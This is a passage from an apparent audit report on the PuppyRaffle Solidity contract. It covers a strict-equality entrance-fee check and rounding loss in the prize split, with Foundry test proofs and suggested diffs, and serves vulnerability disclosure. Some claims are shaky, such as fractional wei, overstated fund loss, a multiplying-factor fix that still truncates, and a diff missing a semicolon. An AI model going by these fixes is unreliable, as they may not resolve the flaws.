When a player attempts to call `enterRaffle` with `msg.value` higher or lower than `entranceFee * newPlayers.length`, the protocol reverts with a "PuppyRaffle: Must send enough to enter raffle" error.

```diff
    function enterRaffle(address[] memory newPlayers) public payable {
-        require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
				// ...
    }
```

&nbsp;
## Proof of Concept
The provided test demonstrates the validity and severity of this vulnerability.

<details>

### How to Run the Test
**Requirements**:
- Install [Foundry](https://book.getfoundry.sh/getting-started/installation.html).
- Clone the project codebase into your local workspace.

**Step-by-step Guide to Run the Test**:
1. Ensure the above requirements are met.
2. Copy the test below and add it to `PuppyRaffleTest.t.sol` tests.
3. Execute the following command in your terminal to run the test:

```bash
forge test --match-test "testCantEnterWithMoreThanEntranceFee"
```

### Code
```solidity
    function testCantEnterWithMoreThanEntranceFee() public {
        address[] memory players = new address[](1);
        players[0] = playerOne;
        vm.expectRevert("PuppyRaffle: Must send enough to enter raffle");
        puppyRaffle.enterRaffle{value: entranceFee + 10}(players);
    }
```
Note that the test passes even though the caller sends more than enough to enter the raffle.

</details>

&nbsp;
## Impact
**Creates a Poor User Experience:** The current strict equality check can frustrate potential players, leading to a poor user experience. PuppyRaffle may miss out on potential revenue as frustrated players give up on participating.

&nbsp;
## Tools Used
- Foundry

&nbsp;
## Recommendations
Change the strict equality `==` to a more flexible option `>=`. The modified function should look like this:

```diff
    function enterRaffle(address[] memory newPlayers) public payable {
+				require(newPlayers.length > 0, "Empty arrays not allowed!")
+       require(msg.value >= entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
				// ...
    }
```

Also, update the solidity version to v0.8.*
***
***

# Possible Precision Loss in `PuppyRaffle::selectWinner` Leads to Loss of Funds

## Summary
Setting the `entranceFee` to an extremely low value can result in the winner and the protocol losing some or all of their funds due to number rounding errors.

**Related GitHub Links:**
https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L131-L133

&nbsp;
## Vulnerability Details
If the `entranceFee` is set to a very low value, such as 1 wei, the `prizePool` and `fee` calculations in the `selectWinner` function are susceptible to rounding errors. This is because Solidity does not handle decimals well.

```diff
function selectWinner() external {
				// ...
        uint256 totalAmountCollected = players.length * entranceFee;
-        uint256 prizePool = (totalAmountCollected * 80) / 100;
-        uint256 fee = (totalAmountCollected * 20) / 100;
        totalFees = totalFees + uint64(fee);
				// ...
    }
```

&nbsp;
## Proof of Concept
The provided test demonstrates the validity and severity of this vulnerability.

<details>

### How to Run the Test
**Requirements**:
- Install [Foundry](https://book.getfoundry.sh/getting-started/installation.html).
- Clone the project codebase into your local workspace.

**Step-by-step Guide to Run the Test**:
1. Ensure the above requirements are met.
2. Copy the test below and add it to `PuppyRaffleTest.t.sol` tests.
3. Execute the following command in your terminal to run the test:

```bash
forge test --match-test "testWinnerLossesSomeFunds"
```

### Code
```solidity
    function testWinnerLossesSomeFunds() public playersEntered {
        uint256 balanceBefore = address(playerFour).balance;

        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        uint256 expectedPayout = (((entranceFee * 4) * 80) / 100);
        /// @notice Actual result is (((1 wei * 4) * 80) / 100) == 3.2
        /// @notice But Solidity returns 3

        puppyRaffle.selectWinner();
        assertEq(address(playerFour).balance, balanceBefore + expectedPayout);
        assertEq(address(playerFour).balance, balanceBefore + 3);
    }
```
Note that the winner receives 3 wei instead of 3.2 wei due to Solidity's handling of decimals.

</details>

&nbsp;
## Impact
**Permanent Loss of Funds for Both the Protocol and the Winner**

&nbsp;
## Tools Used
- Foundry

&nbsp;
## Recommendations
To address the precision loss issue, consider using a multiplying factor to deal with rounding errors. Here's an example of how to implement this:

```diff
// Declare a constant MULTIPLY_FACTOR and set it to a high value
+	uint256 constant MULTIPLY_FACTOR = 1_000_000_000;

// Multiply every wei or ether value by MULTIPLY_FACTOR before performing calculations
// Divide every wei or ether value by MULTIPLY_FACTOR when sending ether/wei

function selectWinner() external {
				// ...
+       uint256 totalAmountCollected = (players.length * entranceFee) * MULTIPLY_FACTOR;
        uint256 prizePool = (totalAmountCollected * 80) / 100;
        uint256 fee = (totalAmountCollected * 20) / 100;
        totalFees = totalFees + uint64(fee);

				// ...
				
+        (bool success, ) = winner.call{value: prizePool / MULTIPLY_FACTOR}("");
        require(success, "PuppyRaffle: Failed to send the prize pool to the winner");
        _safeMint(winner, tokenId);
    }
```

Alternatively, you could set a lower bound for the allowed `entranceFee` to prevent precision loss.

***
***